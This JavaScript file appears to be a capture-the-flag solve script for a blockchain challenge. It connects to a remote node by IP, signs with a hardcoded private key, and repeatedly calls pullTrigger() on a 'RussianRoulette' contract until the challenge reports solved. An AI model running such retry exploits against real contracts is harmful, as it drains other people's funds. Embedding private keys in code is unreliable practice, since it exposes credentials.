const Web3 = require('web3');

const web3 = new Web3.Web3(new Web3.Web3.providers.HttpProvider('http://94.237.59.119:56217'));

const privateKey = '0xfeabee495252e1d68de99edee0e78a0a1c4be31f258fd71ae4d93a3392e8c0a1'
const signer = web3.eth.accounts.privateKeyToAccount(privateKey);
const Setup_deployedAddress = '0x6C093c4dD4aA6F0bb532CC47cf6216eb3F57e580';
const RussianRoulett_deployedAddress = '0xa3609eE8ebaEeA37BdC09915fb17dE3379409c2C';

const Setup_abi = require('./contracts/Setup_sol_Setup.json');
const SetupContract = new web3.eth.Contract(Setup_abi, Setup_deployedAddress);
const RussianRoulette_abi = require('./contracts/RussianRoulette_sol_RussianRoulette.json');
const RussianRoulettContract = new web3.eth.Contract(RussianRoulette_abi, RussianRoulett_deployedAddress);

async function callIsSolved() {
  return SetupContract.methods.isSolved().call();
}

async function callPullTrigger() {
  await RussianRoulettContract.methods.pullTrigger().send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('pullTrigger called')
  ).catch(error => console.error('Error calling pullTrigger: ', error));
}

async function exploit() {
  var solved = await callIsSolved()
  console.log(`Solved: `, solved)
  while (solved == false){
    await callPullTrigger()
    solved = await callIsSolved()
    console.log(`Solved: `, solved)
  }
}

exploit()